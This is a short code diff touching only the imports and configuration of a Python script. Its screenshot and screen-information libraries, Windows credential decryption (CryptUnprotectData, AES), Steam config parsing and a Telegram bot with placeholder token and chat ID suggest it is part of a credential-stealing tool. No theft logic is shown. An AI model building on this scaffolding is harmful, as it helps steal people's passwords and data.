@@ -4,12 +4,13 @@ import cv2
 import shutil
 import configparser
 import subprocess
-import pyautogui
+from PIL import ImageGrab
 import sqlite3
 import re
 from win32crypt import CryptUnprotectData
 import win32crypt
-import json,base64
+from json import *
+import base64
 from os.path import basename
 from datetime import datetime, timedelta
 from Crypto.Cipher import AES
@@ -31,7 +32,9 @@ from zipfile import ZipFile
 from shutil import copy2
 from subprocess import Popen, PIPE
 from re import findall, match
+from screeninfo import get_monitors
 import vdf
+
 
 chat_id = ''#СЮДА CHAT ID
 bot = telebot.TeleBot('')#СЮДА ТОКЕН БОТА
